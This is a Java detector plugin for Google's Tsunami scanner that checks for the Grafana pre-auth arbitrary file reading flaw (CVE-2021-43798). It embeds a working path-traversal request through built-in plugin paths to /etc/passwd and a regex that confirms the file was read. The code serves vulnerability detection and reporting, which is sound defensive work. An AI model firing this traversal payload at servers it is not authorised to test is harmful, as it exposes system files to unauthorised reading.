/*
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.grafana;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.base.Preconditions.checkState;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;

import com.google.auto.value.AutoValue;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.AdditionalDetail;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.TextData;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.Optional;
import java.util.regex.Pattern;
import javax.inject.Inject;

/**
 * A {@link VulnDetector} that detects the Grafana Pre-Auth Arbitrary File Reading vulnerability.
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "GrafanaArbitraryFileReadingDetector",
    version = "1.0",
    description = "This detector checks for Grafana Pre-Auth Arbitrary File Reading vulnerability "
        + "(CVE_2021_43798).",
    author = "threedr3am (qiaoer1320@gmail.com)",
    bootstrapModule = GrafanaArbitraryFileReadingDetectorBootstrapModule.class
)
public class GrafanaArbitraryFileReadingDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String VUL_PATH_FMT = "public/plugins/{plugin}/..%2F..%2F..%2F..%2F.."
      + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
      + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
      + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
      + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
      + "%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F.."
      + "%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd";
  private static final Pattern VULNERABILITY_RESPONSE_PATTERN = Pattern.compile("(root:[x*]:0:0:)");
  private static final ImmutableList<String> PLUGINS =
      ImmutableList.of(
          "annolist",
          "barchart",
          "bargauge",
          "gauge",
          "geomap",
          "gettingstarted",
          "histogram",
          "jaeger",
          "logs",
          "loki",
          "mssql",
          "news",
          "nodeGraph",
          "piechart",
          "stat",
          "state-timeline",
          "status-history",
          "table-old",
          "tempo",
          "testdata",
          "timeseries",
          "welcome",
          "zipkin",
          "grafana-clock-panel",
          "alertlist",
          "graph",
          "elasticsearch",
          "dashlist",
          "cloudwatch",
          "mysql",
          "influxdb",
          "heatmap",
          "graphite",
          "prometheus",
          "postgres",
          "pluginlist",
          "opentsdb",
          "text",
          "table",
          "stackdriver",
          "grafana-azure-monitor-datasource",
          "grafana-simple-json-datasource"
      );

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  GrafanaArbitraryFileReadingDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isWebServiceOrUnknownService)
                .map(this::checkUrlWithPlugin)
                .filter(CheckResult::isVulnerable)
                .map(checkResult -> buildDetectionReport(targetInfo, checkResult))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isWebServiceOrUnknownService(NetworkService networkService) {
    return networkService.getServiceName().isEmpty()
        || NetworkServiceUtils.isWebService(networkService)
        || NetworkServiceUtils.getServiceName(networkService).equals("unknown");
  }

  private CheckResult checkUrlWithPlugin(NetworkService networkService) {
    for (String plugin : PLUGINS) {
      String targetUri = buildTargetUrl(networkService, plugin);
      try {
        HttpResponse response = httpClient.send(
            HttpRequest.get(targetUri).withEmptyHeaders().build(),
            networkService);
        if (response.status() == HttpStatus.OK && response.bodyString().isPresent()) {
          String responseBody = response.bodyString().get();
          if (VULNERABILITY_RESPONSE_PATTERN.matcher(responseBody).find()) {
            return CheckResult.buildForVulnerableDetection(networkService, targetUri, response);
          }
        }
      } catch (IOException e) {
        logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
      }
    }
    return CheckResult.buildForSecureService(networkService);
  }

  private static String buildTargetUrl(NetworkService networkService, String plugin) {
    StringBuilder targetUrlBuilder = new StringBuilder();
    if (NetworkServiceUtils.isWebService(networkService)) {
      targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
    } else {
      // Assume the service uses HTTP protocol when the scanner cannot identify the actual service.
      targetUrlBuilder
          .append("http://")
          .append(toUriAuthority(networkService.getNetworkEndpoint()))
          .append("/");
    }
    targetUrlBuilder.append(VUL_PATH_FMT.replace("{plugin}", plugin));
    return targetUrlBuilder.toString();
  }

  public DetectionReport buildDetectionReport(
      TargetInfo targetInfo, CheckResult checkResult) {
    NetworkService vulnerableNetworkService = checkResult.networkService();
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2021_43798"))
                .setSeverity(Severity.HIGH)
                .setTitle("Grafana Pre-Auth Arbitrary File Reading vulnerability (CVE_2021_43798)")
                .setDescription(
                    "In Grafana 8.0.0 to 8.3.0, there is an endpoint that can be accessed "
                        + "without authentication. This endpoint has a directory traversal "
                        + "vulnerability, and any user can read any file on the server "
                        + "without authentication, causing information leakage.")
                .setRecommendation("Update to 8.3.1 version or later.")
                .addAdditionalDetails(buildAdditionalDetail(checkResult))
        )
        .build();
  }

  private AdditionalDetail buildAdditionalDetail(CheckResult checkResult) {
    checkState(checkResult.isVulnerable());
    checkState(checkResult.vulnerableUrl().isPresent());
    checkState(checkResult.response().isPresent());
    HttpResponse response = checkResult.response().get();
    StringBuilder reportBuilder = new StringBuilder();
    reportBuilder
        .append("Vulnerable target:\n")
        .append(checkResult.vulnerableUrl().get())
        .append("\n\nResponse:\n")
        .append(response.status().code())
        .append(' ')
        .append(response.status())
        .append('\n');
    response
        .headers()
        .names()
        .forEach(
            headerName ->
                response
                    .headers()
                    .getAll(headerName)
                    .forEach(
                        headerValue ->
                            reportBuilder
                                .append(headerName)
                                .append(": ")
                                .append(headerValue)
                                .append('\n')));
    response.bodyString().ifPresent(body -> reportBuilder.append('\n').append(body));
    return AdditionalDetail.newBuilder()
        .setTextData(TextData.newBuilder().setText(reportBuilder.toString()))
        .build();
  }

  @AutoValue
  abstract static class CheckResult {

    abstract boolean isVulnerable();

    abstract NetworkService networkService();

    abstract Optional<String> vulnerableUrl();

    abstract Optional<HttpResponse> response();

    static CheckResult buildForVulnerableDetection(
        NetworkService networkService, String url, HttpResponse response) {
      return new AutoValue_GrafanaArbitraryFileReadingDetector_CheckResult(
          true, networkService, Optional.of(url), Optional.of(response));
    }

    static CheckResult buildForSecureService(NetworkService networkService) {
      return new AutoValue_GrafanaArbitraryFileReadingDetector_CheckResult(
          false, networkService, Optional.empty(), Optional.empty());
    }
  }
}
